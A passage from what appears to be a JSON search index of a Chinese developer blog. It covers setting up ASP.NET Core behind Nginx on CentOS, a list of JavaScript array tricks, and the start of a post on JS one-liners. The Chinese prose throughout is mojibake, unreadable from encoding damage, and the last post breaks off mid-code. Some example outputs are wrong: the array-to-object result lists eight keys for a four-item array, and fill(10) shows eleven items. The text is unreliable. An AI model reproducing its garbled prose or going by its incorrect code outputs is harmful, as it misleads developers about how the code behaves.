è·‘ Nginxã€ç”¨ Dockerfile å°‡ ASP.NET Core ç¶²ç«™åŒ…æˆ Containerã€ç”¨ Port æ˜ å° Host OS TCP Port åˆ° Containerã€ä½¿ç”¨ -v(\u0026ndash;volume) æ˜ å°è³‡æ–™å¤¾è®“ Container è®€å¯« Host OS æª”æ¡ˆã€‚\nè€Œåœ¨å¯¦å‹™æ‡‰ç”¨ä¸Šï¼Œç›¸é—œçš„ Conatiner éœ€è¦çµ„åˆåœ¨ä¸€èµ·åŸ·è¡Œï¼Œä¾‹å¦‚ä¸€å€‹ Container è·‘ç¶²ç«™ï¼Œä¸€å€‹ Container è·‘è³‡æ–™åº«ï¼Œæ­¤æ™‚å¯ç”¨ docker-compose ç°¡åŒ–ç®¡ç†ï¼›å¦å¤– Docker ä¹Ÿæä¾› Bridge ç‚ºç›¸é—œ Container å»ºç«‹å°ˆå±¬çš„éš”é›¢ç¶²æ®µï¼Œé˜²æ­¢å¤–ç•Œæ¥è§¸åˆ°ä¸æƒ³å°å¤–å…¬é–‹çš„ç¶²è·¯æœå‹™ï¼Œä¹Ÿé¿å…ä¸ç›¸å¹²çš„ Container å½¼æ­¤å¹²æ“¾\u0026hellip; é€™äº›è­°é¡Œå°±ç•™å¾…ä¸‹ä¸€ç¯‡æ–‡ç« è¨è«–ã€‚\n","date":"2022-12-06T00:00:00Z","image":"https://live.staticflickr.com/65535/52565101723_e9c2825542_o.png","permalink":"https://wayneblog.ga/2022-12-06/dotnet-core-docker-note-1/","title":"ASP.NET Core Docker ç­†è¨˜ 1 - åˆæ¢"},{"content":" åƒè€ƒç¶²ç«™\nASP.NET Core å…§å»ºçš„ Kestrel ä¼ºæœå™¨è¼•å·§ä½†åŠŸèƒ½é™½æ˜¥ï¼Œå¯¦å‹™ä¸Šéœ€æ­é… Reverse Proxy å°å¤–æä¾›æœå‹™ï¼ŒLinux æœ‰å…©å¤§ Reverse Proxy é¸æ“‡ï¼šApache åŠ Nginxï¼Œé€™é‚Šç­†è¨˜ä¸€ä¸‹ä½¿ç”¨é€™å¹¾å¹´å¦‚æ—¥ä¸­å¤©çš„ Nginxã€‚\nç›¸è¼ƒæ–¼ Apacheã€lighttpdï¼ŒNginx æ¨™æ¦œå–®ä¸€åŸ·è¡Œç·’ã€è¨˜æ†¶è€—ç”¨å°‘ã€ç©©å®šæ€§é«˜ï¼Œå¼·èª¿æ•ˆèƒ½å–å‘ï¼Œåœ¨ç†±é–€ç¶²ç«™é–“ç¨éœ¸ä¸€æ–¹(åƒè€ƒï¼šç¶­åŸºç™¾ç§‘)ï¼Œèˆ‡å¼·èª¿æ•ˆèƒ½çš„ ASP.NET Core æ­é…ï¼Œç›¸å¾—ç›Šå½°ã€‚\nä»¥ä¸‹æ˜¯æˆ‘çš„ CentOS Nginx å®‰è£è¨­å®šç­†è¨˜ï¼š\nå®‰è£ Nginxã€‚åƒè€ƒï¼šHow To Install Nginx on CentOS 7 1 2 sudo yum install epel-release sudo yum install nginx ç™¼ç¾ CentOS é è¨­æ²’è£ telnet å®¢æˆ¶ç«¯ï¼Œæª¢æ¸¬æŸ¥ä¿®ä¸ä¾¿ï¼Œå®‰è£ä¸€ä¸‹ telnetï¼š 1 sudo yum install telnet å•Ÿå‹• Nginx 1 sudo systemctl start nginx å•Ÿå‹•å¾Œ telnet localhost 80 å¦‚æœ‰é€£ä¸Šå°±æ˜¯æˆåŠŸäº†ã€‚å¦‚å¾å¤–éƒ¨é€£ä¸ä¸Šå¤šæ˜¯é˜²ç«ç‰†ç·£æ•…ï¼Œéœ€é¡å¤–è¨­å®šï¼š\n1 2 3 sudo firewall-cmd --permanent --zone=public --add-service=http sudo firewall-cmd --permanent --zone=public --add-service=https sudo firewall-cmd --reload è¨­å¥½é˜²ç«ç‰†ï¼Œå¾ Windows é–‹ Chrome é€£ä¸Š CentOS ä¸»æ©Ÿ 80 Portï¼Œå¦‚æœçœ‹åˆ° Nginx æ­¡è¿ç¶²é å³ä»£è¡¨å¤§åŠŸå‘Šæˆã€‚\nASP.NET Core æ–‡ä»¶æœ‰è©³ç´°çš„Nginx è¨­å®šæ•™å­¸ï¼Œåšæ³•æ˜¯ç›´æ¥ä¿®æ”¹ /etc/nginx/nginx.confï¼Œåœ¨ http å€å¡ŠåŠ å…¥ server è¨­å®šã€‚ ä½†è¼ƒæ¨¡çµ„åŒ–çš„åšæ³•æ˜¯ç‚ºæ¯å€‹ç«™å°å¯«ç¨ç«‹ conf æª”æ”¾åœ¨ /etc/nginx/conf.d ä¸‹ã€‚ä¾‹å¦‚ï¼š/etc/nginx/conf.d/default.conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 server { listen 80; server_name linux.darkblog.net; #æ¸¬è©¦ç”¨çš„è‡ªè¨‚ç¶²åŸŸåç¨± location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } è¨­å®šå®Œç•¢å…ˆç”¨ sudo nginx -t æ¸¬è©¦è¨­å®šæª”æœ‰æ²’æœ‰è¢«æ”¹å£ï¼Œè‹¥ OK å°±åŸ·è¡Œ sudo nginx -s reload é‡æ–°è¼‰å…¥ã€‚\nè©¦é€£æ™‚æˆ‘é‡åˆ° 502 Bad Gateway éŒ¯èª¤ï¼š 1 2 2018/09/24 15:37:53 [crit] 60137#0: *7 connect() to 127.0.0.1:5000 failed (13: Permission denied) while connecting to upstream, client: 192.168.50.159, server: linux.darkblog.net, request: \u0026#34;GET / HTTP/1.1\u0026#34;, upstream: \u0026#34;http://127.0.0.1:5000/\u0026#34;, host: \u0026#34;linux.darkblog.net\u0026#34; 2018/09/24 15:37:53 [error] 60137#0: *7 no live upstreams while connecting to upstream, client: 192.168.50.159, server: linux.darkblog.net, request: \u0026#34;GET /favicon.ico HTTP/1.1\u0026#34;, upstream: \u0026#34;http://localhost/favicon.ico\u0026#34;, host: \u0026#34;linux.darkblog.net\u0026#34;, referrer: \u0026#34;http://linux.darkblog.net/\u0026#34; çˆ¬æ–‡æ˜¯ Security-Enhanced Linux (SELinux) ä½œç¥Ÿï¼Œå®ƒæ˜¯ RHEL 6.6+/CentOS 6.6+ æ–°åŠ çš„å®‰å…¨é–ï¼Œéœ€ä¸‹æŒ‡ä»¤è§£é™¤å°å°ï¼š\n1 sudo setsebool -P httpd_can_network_connect on æ¥è‘—è¦è¨­å®š SSLï¼š æœ‰å€‹å¾ˆå¨çš„å·¥å…·å« Certbotï¼Œå¯ä»¥è‡ªå‹•ç”³è«‹ã€é©—è­‰ã€ä¸‹è¼‰ã€å®‰è£ä¸¦å®šæœŸæ›´æ–° Let\u0026rsquo;s Enrypt æ†‘è­‰ã€‚ä½†é€™éƒ¨åˆ†è¦å°‡ç¶²ç«™æ­£å¼æ›ä¸Š Internet æ‰å¥½æ¸¬è©¦ï¼ŒçœŸå¯¦æ†‘è­‰ç•™å¾…æœªä¾†å†ç©ï¼Œæˆ‘å…ˆåšä¸€å¼µè‡ªç™¼æ†‘è­‰é©—è­‰ SSL åŠŸèƒ½ã€‚\n1 2 3 4 sudo mkdir /etc/ssl/private sudo chmod 700 /etc/ssl/private sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/nginx-selfsigned.key -out /etc/ssl/certs/nginx-selfsigned.crt sudo openssl dhparam -out /etc/ssl/certs/dhparam.pem 2048 å»ºç«‹ä¸€å€‹ /var/nginx/conf.d/ssl.conf\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 server { listen 443 http2 ssl; listen [::]:443 http2 ssl; server_name linux.darkblog.net; ssl_certificate /etc/ssl/certs/nginx-selfsigned.crt; ssl_certificate_key /etc/ssl/private/nginx-selfsigned.key; ssl_dhparam /etc/ssl/certs/dhparam.pem; location / { proxy_pass http://localhost:5000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection keep-alive; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; } } åƒè€ƒï¼š\nHow To Secure Nginx with Let\u0026rsquo;s Encrypt on CentOS 7 NGINX ä½¿ç”¨ Letâ€™s Encrypt å…è²» SSL æ†‘è­‰è¨­å®š HTTPS å®‰å…¨åŠ å¯†ç¶²é æ•™å­¸ - G.T.Wang How To Create a Self-Signed SSL Certificate for Nginx on CentOS 7 NLog.config è·¯å¾‘é…åˆä½œæ¥­ç³»çµ±è¦æ”¹ \u0026quot;/var/log/Darkblog/$/$.log\u0026quot;\nåœ¨ Reverse Proxy æ¨¡å¼ä¸‹ HttpContext.Connection.RemoteIpAddress æœƒæŠ“åˆ° ::1ï¼Œè€Œ HttpContext.Connection.RemotePort å‰‡æ˜¯ 5000ï¼Œä¸¦éçœŸå¯¦å®¢æˆ¶ç«¯ IP åŠå°å¤– Portã€‚åœ¨ Startup.cs åŠ å…¥ app.UseForwardedHeaders() å¯è§£æ±ºå•é¡Œï¼Œä½†å•Ÿç”¨ UseForwardedHeaders() è‹¥æœªæ­é… Reverse Proxy æœƒæœ‰ä¾†æº IP å½é€ é¢¨éšªï¼Œä¸æƒ³å†’éšªä¹Ÿä¸æƒ³é‡å° IIS / Nginx èª¿æ•´è¨­å®šï¼Œæˆ‘æƒ³åˆ°ä¸€æ‹›è®“ç¨‹å¼è‡ªå‹•ä¾ OS æ±ºå®šè¦ä¸è¦å•Ÿç”¨ï¼Œä¸€å‹æ°¸é€¸ï¼š\n1 2 3 4 5 6 7 8 9 10 11 public void Configure(IApplicationBuilder app, IHostingEnvironment env) { //é‹è¡Œæ–¼ Linux æ™‚å•Ÿç”¨ Reverse Proxy æ¨¡å¼ if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux)) { app.UseForwardedHeaders(new ForwardedHeadersOptions { ForwardedHeaders = ForwardedHeaders.XForwardedFor | ForwardedHeaders.XForwardedProto }); } } ç·šä¸Šä¸»æ©Ÿç•¶ç„¶ä¸å¥½æ¯æ¬¡é æ‰‹å‹•è¼¸å…¥ dotnet Blah.dll å•Ÿå‹•ç¶²ç«™ï¼ŒASP.NET Core æ–‡ä»¶å±•ç¤ºäº†å°‡ç¨‹å¼åŒ…æˆæœå‹™çš„æ–¹æ³•ã€‚å…ˆå»ºç«‹ /etc/systemd/system/kestrel-darkblog.serviceï¼Œå…§å®¹å¦‚ä¸‹ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 [Unit] Description=Darkblog.Core Server [Service] WorkingDirectory=/var/www/Darkblog ExecStart=/usr/bin/dotnet /var/www/Darkblog/Darkblog.Core.dll Restart=always # Restart service after 10 seconds if the dotnet service crashes: RestartSec=10 SyslogIdentifier=darkblog-core User=www-data Environment=ASPNETCORE_ENVIRONMENT=Production Environment=DOTNET_PRINT_TELEMETRY_MESSAGE=false [Install] WantedBy=multi-user.target è¨­å¥½ kestrel-darkblog.service å¾Œè¨»å†Šä¸¦å•Ÿå‹•æœå‹™ 1 2 3 sudo systemctl enable kestrel-darkblog.service sudo systemctl start kestrel-darkblog.service sudo systemctl status kestrel-darkblog.service é¦¬ä¸Šé‡åˆ°éŒ¯èª¤ï¼š\n1 (code=exited, status=217/USER) Process: 66571 ExecStart=/usr/bin/dotnet /var/www/Darkblog/Darkblog.Core.dll (code=exited, status=1/FAILURE) åŸå› æ˜¯æœå‹™æ¨¡å¼ä½¿ç”¨ www-data èº«åˆ†åŸ·è¡Œï¼Œæ²’æœ‰æ¬Šé™å­˜å– ASP.NET Core ç¶²ç«™æ‰€åœ¨ç›®éŒ„èˆ‡æª”æ¡ˆã€‚é€™éƒ¨åˆ†æˆ‘ä¸æ˜¯å¾ˆç¢ºå®šåšæ³•ï¼Œæ‰¾åˆ°çš„è§£æ³•æ˜¯ç”¨ chown å°‡ /var/www/Darkblog ç›®éŒ„çš„æ“æœ‰è€…åŠç¾¤çµ„éƒ½è¨­æˆ www-dataï¼Œå»ºç«‹ www-data å¸³è™ŸåŠç¾¤çµ„ï¼Œä¸¦å°‡æˆ‘çš„ç®¡ç†å¸³è™Ÿä¹ŸåŠ å…¥ www-data ç¾¤çµ„ï¼Œå¦‚æ­¤æœå‹™å¯ä»¥å­˜å–è©²ç›®éŒ„ï¼Œè€Œæˆ‘ä¹Ÿæœ‰æ¬Šé™éƒ¨ç½²æª”æ¡ˆã€‚(è¨»ï¼š) ä»¥ä¸‹æŒ‡ä»¤å»ºç«‹ www-data ä½¿ç”¨è€…åŠç¾¤çµ„ï¼Œå°‡ jeffrey åŠ å…¥ç¾¤çµ„ï¼Œä¸¦æˆèˆ‡ www-data ç¾¤çµ„å¯ä»¥å¯«å…¥ï¼š\n1 2 3 4 sudo groupadd www-data sudo useradd -g www-data www-data sudo usermod -a -G www-data jeffrey sudo chmod g+w -R /var/www/Darkblog æœ‰ä¸€å‰‡å°è¨£ç«…ï¼Œä»¥æœå‹™æ–¹å¼åŸ·è¡Œ ASP.NET Core çœ‹ä¸åˆ°ä¸»æ§å°é¡¯ç¤ºçš„éŒ¯èª¤è¨Šæ¯ï¼Œå¯æ”¹ç”¨é€™å€‹æŒ‡ä»¤ä¾†æŸ¥çœ‹ï¼š 1 sudo journalctl -fu kestrel-darkblog.service ä»¥ä¸Šï¼ŒASP.NET Core + Nginx on CentOS åŸ·è¡ŒæˆåŠŸã€‚\né™„ä¸Š CPU / Memory ä½¿ç”¨ç‹€æ³ï¼Œé€™æ˜¯åœ¨é–‹ç€è¦½å™¨ç‹‚æŒ‰ F5 ä¸‹çš„æ•¸å­—ï¼Œç¸½è¨˜æ†¶é«” 1GBï¼Œdotnet CPU åœ¨ 5% ä»¥ä¸‹ï¼ŒRAM è€—ç”¨ä¸åˆ° 10%ï¼Œæœ‰å€‹ kworker CPU åé«˜ï¼Œçˆ¬æ–‡èˆ‡ç¡¬ç¢Ÿæœ‰é—œï¼Œæ¨æ¸¬èˆ‡ Win10 Hyper-V VM ä¸æ€éº¼çš„è™›æ“¬ç£ç¢Ÿæ•ˆèƒ½æœ‰é»é—œä¿‚ã€‚ä½†æ•´é«”æ•¸å­—è®“æˆ‘å¾ˆæ»¿æ„ï¼Œé·éƒ½ CentOS è¨ˆåŠƒç¹¼çºŒæŒºé€²ã€‚\n","date":"2022-12-06T00:00:00Z","image":"https://live.staticflickr.com/65535/52564798549_d9c11f4419_o.png","permalink":"https://wayneblog.ga/2022-12-06/dotnet-nginx-install-on-centos/","title":"åœ¨ CentOS ä¸Šå®‰è£ ASP.NET Core + Nginx çš„ç­†è¨˜"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\né™£åˆ—æ˜¯ JavaScript ä¸­æœ€å¸¸ç”¨åˆ°çš„æ¦‚å¿µä¹‹ä¸€ã€‚è™•ç†è³‡æ–™æ™‚å¾ˆå¸¸ç”¨åˆ°é€™ç¨®è³‡æ–™çµæ§‹ã€‚é€™ç¯‡æ–‡ç« ä»‹ç´¹ä¸€äº›é™£åˆ—æ“ä½œçš„åŸºæœ¬æ–¹æ³•ï¼Œå¸Œæœ›å°ä½ æœ‰å¹«åŠ©ï¼\nå¾é™£åˆ—ä¸­ç§»é™¤é‡è¤‡é …ç›® å¾ˆç¶“å…¸çš„é¢è©¦å•é¡Œï¼Œéœ€è¦å¾é™£åˆ—ä¸­æ‰¾å‡ºç¨ç«‹å€¼ã€‚ä½¿ç”¨ Set è³‡æ–™å‹æ…‹ï¼Œå¯ä»¥è¼•æ˜“å®Œæˆé€™ä»»å‹™ã€‚é€™é‚Šä»‹ç´¹å…©ç¨®æ–¹æ³•ï¼Œä¸€å€‹ä½¿ç”¨ .from() ä¸€å€‹ä½¿ç”¨ \u0026hellip; å±•é–‹é‹ç®—å­ã€‚\n1 2 3 4 5 6 7 8 9 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;]; // First method var uniqueFruits = Array.from(new Set(fruits)); console.log(uniqueFruits); // returns [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;grape\u0026#34;] // Second method var uniqueFruits2 = [...new Set(fruits)]; console.log(uniqueFruits2); // returns [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;grape\u0026#34;] å¾é™£åˆ—ä¸­æŠ½æ›æ‰æŸå€‹å…ƒç´  é€™å€‹æƒ…å¢ƒä¹Ÿå¾ˆå¸¸è¦‹ã€‚æœ‰ä¸€å€‹ç°¡å–®çš„å¥½æ–¹æ³•ï¼Œå°±æ˜¯ä½¿ç”¨ .splice ï¼Œåƒæ•¸åˆ†åˆ¥æ˜¯é–‹å§‹ä¿®æ”¹çš„ä½ç½®ã€ä¿®æ”¹å¹¾å€‹å…ƒç´ ã€è¦æ›´æ”¹æˆå“ªäº›å€¼ã€‚\n1 2 3 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;]; fruits.splice(0, 2, \u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;); console.log(fruits); // returns [\u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;] ä¸ç”¨ .map() çš„ map åŠŸèƒ½ .map() å¾ˆå¸¸ç”¨ã€å¤§å®¶éƒ½æœƒç”¨ï¼Œä½†æœ‰ä¸€å€‹æ–¹æ³•ä¹Ÿå¾ˆä¸éŒ¯ï¼Œä¹Ÿå¾ˆç°¡æ½”ï¼Œå°±æ˜¯ .from()ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 var friends = [ { name: \u0026#34;John\u0026#34;, age: 22 }, { name: \u0026#34;Peter\u0026#34;, age: 23 }, { name: \u0026#34;Mark\u0026#34;, age: 24 }, { name: \u0026#34;Maria\u0026#34;, age: 22 }, { name: \u0026#34;Monica\u0026#34;, age: 21 }, { name: \u0026#34;Martha\u0026#34;, age: 19 }, ] var friendsNames = Array.from(friends, ({name}) =\u0026gt; name); console.log(friendsNames); // returns [\u0026#34;John\u0026#34;, \u0026#34;Peter\u0026#34;, \u0026#34;Mark\u0026#34;, \u0026#34;Maria\u0026#34;, \u0026#34;Monica\u0026#34;, \u0026#34;Martha\u0026#34;] æ¸…ç©ºé™£åˆ— æœ‰æ™‚å€™ä½ æœƒéœ€è¦æ¸…ç©ºä¸€å€‹é™£åˆ—ã€‚ä¸€å€‹ä¸€å€‹æŠŠå…ƒç´ åˆªæ‰å¤ªæ…¢äº†ï¼Œä¸‹é¢é€™å€‹æ–¹æ³•å¿«å¤šäº†ï¼šç›´æ¥æŠŠé•·åº¦è¨­ç‚º 0 å§ï¼\n1 2 3 4 5 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;grape\u0026#34;, \u0026#34;apple\u0026#34;]; fruits.length = 0; console.log(fruits); // returns [] æŠŠé™£åˆ—è½‰æ›ç‚ºç‰©ä»¶ æœ‰æ™‚éœ€è¦æŠŠé™£åˆ—è½‰æˆç‰©ä»¶ã€‚ä½¿ç”¨ \u0026hellip; å±•é–‹é‹ç®—å­å¯ä»¥å¾ˆå¿«å®Œæˆé€™ä»»å‹™ã€‚\n1 2 3 var fruits = [\u0026#34;banana\u0026#34;, \u0026#34;apple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;watermelon\u0026#34;]; var fruitsObj = { ...fruits }; console.log(fruitsObj); // returns {0: \u0026#34;banana\u0026#34;, 1: \u0026#34;apple\u0026#34;, 2: \u0026#34;orange\u0026#34;, 3: \u0026#34;watermelon\u0026#34;, 4: \u0026#34;apple\u0026#34;, 5: \u0026#34;orange\u0026#34;, 6: \u0026#34;grape\u0026#34;, 7: \u0026#34;apple\u0026#34;} é™£åˆ—å¡æ»¿è³‡æ–™ æœ‰æ™‚éœ€è¦æŠŠä¸€å€‹é™£åˆ—å¡æ»¿æŸäº›è³‡æ–™ã€‚ä½¿ç”¨ .fill() å¯ä»¥å¿«é€Ÿå®Œæˆé€™ä»»å‹™ï¼š\n1 2 var newArray = new Array(10).fill(\u0026#34;1\u0026#34;); console.log(newArray); // returns [\u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;, \u0026#34;1\u0026#34;] åˆä½µé™£åˆ— è€æ–¹æ³•æ˜¯ä½¿ç”¨ .concat() ä¾†åˆä½µã€‚ä½†æœ‰å€‹æ–°æ–¹æ³•ï¼Œå°±æ˜¯ç”¨ \u0026hellip; å±•é–‹é‹ç®—å­ï¼Œéå¸¸ç°¡å–®ä¿è½ï¼š\n1 2 3 4 5 var fruits = [\u0026#34;apple\u0026#34;, \u0026#34;banana\u0026#34;, \u0026#34;orange\u0026#34;]; var meat = [\u0026#34;poultry\u0026#34;, \u0026#34;beef\u0026#34;, \u0026#34;fish\u0026#34;]; var vegetables = [\u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;, \u0026#34;cucumber\u0026#34;]; var food = [...fruits, ...meat, ...vegetables]; console.log(food); // [\u0026#34;apple\u0026#34;, \u0026#34;banana\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;poultry\u0026#34;, \u0026#34;beef\u0026#34;, \u0026#34;fish\u0026#34;, \u0026#34;potato\u0026#34;, \u0026#34;tomato\u0026#34;, \u0026#34;cucumber\u0026#34;] æ‰¾å‡ºé™£åˆ—äº¤é›† é€™ä¹Ÿæ˜¯ JavaScript é¢è©¦æœ€å¸¸è¦‹çš„å•é¡Œã€‚é€™é‚Šä½¿ç”¨ filter è·Ÿ .includes() ä¾†å®Œæˆé€™ä»»å‹™ã€‚\n1 2 3 4 var numOne = [0, 2, 4, 6, 8, 8]; var numTwo = [1, 2, 3, 4, 5, 6]; var duplicatedValues = [...new Set(numOne)].filter(item =\u0026gt; numTwo.includes(item)); console.log(duplicatedValues); // returns [2, 4, 6] æŠŠ false ç›¸é—œçš„å€¼å¾é™£åˆ—ç§»é™¤ false ç›¸é—œå€¼åŒ…å« falseã€0ã€\u0026quot;\u0026quot;ã€nullã€NaNã€undefinedã€‚\nä½¿ç”¨ .filter() å¯ä»¥ä¿è½åœ°éæ¿¾é™£åˆ—ã€‚\n1 2 3 var mixedArr = [0, \u0026#34;blue\u0026#34;, \u0026#34;\u0026#34;, NaN, 9, true, undefined, \u0026#34;white\u0026#34;, false]; var trueArr = mixedArr.filter(Boolean); console.log(trueArr); // returns [\u0026#34;blue\u0026#34;, 9, true, \u0026#34;white\u0026#34;] å¾é™£åˆ—æ’ˆå‡ºéš¨æ©Ÿå…ƒç´  æœ‰æ™‚éœ€è¦éš¨æ©Ÿæ’ˆå…ƒç´ å‡ºä¾†ã€‚æ ¹æ“šé™£åˆ—é•·åº¦ï¼Œéš¨æ©Ÿæ’ˆä¸€å€‹ç´¢å¼•å‡ºä¾†ï¼Œå°±å¯ä»¥å›‰ã€‚\n1 2 var colors = [\u0026#34;blue\u0026#34;, \u0026#34;white\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;brown\u0026#34;]; var randomColor = colors[(Math.floor(Math.random() * (colors.length)))] é€†è½‰é™£åˆ— ä¸éœ€è¦è¤‡é›œçš„è¿´åœˆè·Ÿå‡½æ•¸ï¼Œä¹Ÿèƒ½é€†è½‰ä¸€å€‹é™£åˆ—ã€‚é€™æ¨£ä¸€è¡Œå°±å¯ä»¥ï¼š\n1 2 3 var colors = [\u0026#34;blue\u0026#34;, \u0026#34;white\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;brown\u0026#34;]; var reversedColors = colors.reverse(); console.log(reversedColors); // returns [\u0026#34;brown\u0026#34;, \u0026#34;black\u0026#34;, \u0026#34;yellow\u0026#34;, \u0026#34;orange\u0026#34;, \u0026#34;purple\u0026#34;, \u0026#34;pink\u0026#34;, \u0026#34;navy\u0026#34;, \u0026#34;green\u0026#34;, \u0026#34;white\u0026#34;, \u0026#34;blue\u0026#34;] .lastIndexOf() æ–¹æ³• é€™å€‹æœ‰è¶£çš„æ–¹æ³•ï¼Œå¯ä»¥æ‰¾åˆ°ç‰¹å®šå…ƒç´ æœ€å¾Œä¸€æ¬¡å‡ºç¾çš„ç´¢å¼•ã€‚å¦‚æœé™£åˆ—ä¸­æœ‰é‡è¤‡å€¼ï¼Œå°±å¯ç”¨ä¸Šé€™æ–¹æ³•ã€‚\n1 2 3 var nums = [1, 5, 2, 6, 3, 5, 2, 3, 6, 5, 2, 7]; var lastIndex = nums.lastIndexOf(5); console.log(lastIndex); // returns 9 é™£åˆ—ä¸­å…¨éƒ¨æ•¸å€¼åŠ ç¸½ é€™ä¹Ÿæ˜¯é¢è©¦å¸¸è¦‹è€ƒé¡Œã€‚ä½¿ç”¨ .reduce å¯ä»¥å¿«é€Ÿè§£æ±ºé€™å•é¡Œã€‚\n1 2 3 var nums = [1, 5, 2, 6]; var sum = nums.reduce((x, y) =\u0026gt; x + y); console.log(sum); // returns 14 ","date":"2022-12-05T00:00:00Z","image":"https://live.staticflickr.com/65535/52544052174_68e62fb7f8_o.png","permalink":"https://wayneblog.ga/2022-12-05/js-13-useful-array-tricks/","title":"JavaScript ä¸­é—œæ–¼ Array çš„ 13 å€‹å…¥é–€å°æŠ€å·§ï¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nä¸€è¡Œç¨‹å¼ç¢¼æœ‰æ™‚å¯ä»¥åšåˆ°å¾ˆå¤šäº‹ã€‚é€™é‚Šæœ‰ä¸ƒå€‹å°ä»»å‹™éƒ½ç”¨ä¸€è¡Œå°±å¯ä»¥å®Œæˆï¼Œçµ¦æ‚¨åƒè€ƒï¼\næ´—äº‚é™£åˆ— åœ¨éœ€è¦å°‡é™£åˆ—éš¨æ©Ÿæ‰“äº‚çš„æ™‚å€™ï¼Œé€™è¡Œæœƒå¾ˆå¥½ç”¨ã€‚\n1 2 3 4 5 const shuffleArray = (arr) =\u0026gt; arr.sort(() =\u0026gt; Math.random() - 0.5); // Testing const arr = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]; console.log(shuffleArray(arr)); è¤‡è£½åˆ°å‰ªè²¼æ¿ åœ¨å¯«ç¶²ç«™åŠŸèƒ½çš„æ™‚å€™ï¼Œæœ‰æ™‚æœƒéœ€è¦é€™å€‹åŠŸèƒ½ã€‚\n1 2 3 4 5 const copyToClipboard = (text) =\u0026gt; navigator.clipboard?.writeText \u0026amp;\u0026amp; navigator.clipboard.writeText(text); // Testing copyToClipboard(\u0026#34;Hello World!\u0026#34;); ä¸é‡è¤‡å…ƒç´  æ¯ç¨®èªè¨€éƒ½æœ‰å¯¦ä½œè‡ªå·±çš„ Hash Listï¼Œåœ¨ JavaScript ä¸­ï¼Œå«åš Setã€‚å¯ä»¥ä½¿ç”¨ Set Data Structure è¼•é¬†åœ°æ‰¾å‡ºä¸é‡è¤‡å…ƒç´ ã€‚\n1 2 3 4 5 const getUnique = (arr) =\u0026gt; [...new Set(arr)]; // Testing const arr = [1, 1, 2, 3, 3, 4, 4, 4, 5, 5]; console.log(getUnique(arr)); æª¢æ¸¬æ·±è‰²æ¨¡å¼ æ·±è‰²æ¨¡å¼æ—¥ç›Šæµè¡Œï¼Œå¦‚æœç”¨æˆ¶åœ¨ä»–å€‘çš„è¨­å‚™ä¸­å•Ÿç”¨äº†æ·±è‰²æ¨¡å¼ï¼Œæœ€å¥½å°‡æ‚¨çš„æ‡‰ç”¨ç¨‹åºä¹Ÿåˆ‡æ›åˆ°æ·±è‰²æ¨¡å¼ã€‚\n1 2 3 4 5 6 const isDarkMode = () =\u0026gt; window.matchMedia \u0026amp;\u0026amp; window.matchMedia(\u0026#34;(prefers-color-scheme: dark)\u0026#34;).matches; // Testing console.log(isDarkMode()); æ»‘åˆ°é ‚éƒ¨ æ–°æ‰‹å¸¸å¸¸ç™¼ç¾æ»‘å‹•å…ƒç´ å¾ˆé›£åšã€‚æœ€ç°¡å–®çš„æ–¹æ³•æ˜¯ä½¿ç”¨ scrollIntoViewã€‚\nåŠ ä¸Š behavior å¯ä»¥è®“å‹•ç•«æ›´æµæš¢ã€‚\n1 2 const scrollToTop = 